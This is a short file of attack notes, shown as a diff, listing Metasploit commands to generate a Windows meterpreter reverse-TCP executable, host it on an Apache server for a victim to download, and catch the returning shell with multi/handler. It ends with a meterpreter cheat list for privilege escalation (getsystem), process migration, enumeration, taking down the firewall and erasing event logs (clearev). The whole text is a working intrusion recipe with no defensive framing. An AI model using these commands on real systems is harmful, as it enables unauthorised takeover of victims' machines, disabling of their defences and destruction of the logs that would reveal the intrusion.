@@ -1,0 +1,50 @@
+msfpayload windows/meterpreter/reverse_tcp LHOST=kali-ip LPORT=* x > *.exe
+
+service apache2 start
+
+cp *.exe /var/www
+
+msfconsole:
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost kali-ip
+set lport *
+run
+---------------------------
+for kali 2.0
+
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=kali-ip LPORT=* -f exe > *.exe
+
+service apache2 start
+
+cp *.exe /var/www/html
+
+msfconsole:
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set lhost kali-ip
+set lport *
+run
+
+------------------------
+meterpreter
+
+sysinfo -- System Info
+
+getuid -- Current user privilege
+
+getsystem -- privilege escalation
+
+ps -- running process on victim machine
+
+migrate pid-number
+
+run winenum -- enumeration
+
+run getcountermeasure -d  --- taking down firewall
+
+clearev -- erasing logs
